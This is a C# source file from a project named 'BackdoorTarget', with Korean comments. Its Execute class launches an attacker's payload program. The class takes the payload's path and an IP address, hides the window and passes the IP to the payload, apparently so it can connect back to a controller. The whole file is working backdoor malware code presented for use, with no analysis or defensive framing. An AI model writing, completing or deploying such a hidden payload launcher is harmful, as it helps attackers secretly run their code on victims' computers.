using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace BackdoorTarget
{
    /// <summary>
    /// 공격자의 프로그램을 실행함
    /// </summary>
    public class Execute
    {
        Process Payload = new Process();
        ProcessStartInfo PayloadInfo = new ProcessStartInfo();
        /// <summary>
        /// 프로그램의 경로를 받아 실행
        /// </summary>
        /// <param name="PayloadDir">프로그램의 경로</param>
        public Execute(string PayloadDir,IPAddress IP)
        {
            PayloadInfo.CreateNoWindow = true;
            PayloadInfo.FileName = PayloadDir;
            PayloadInfo.Arguments = IP.ToString();
        }

        /// <summary>
        /// 프로그램을 시작함
        /// </summary>
        public bool StartPayload()
        {
            Payload.StartInfo = PayloadInfo;
            if(Payload.Start())
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
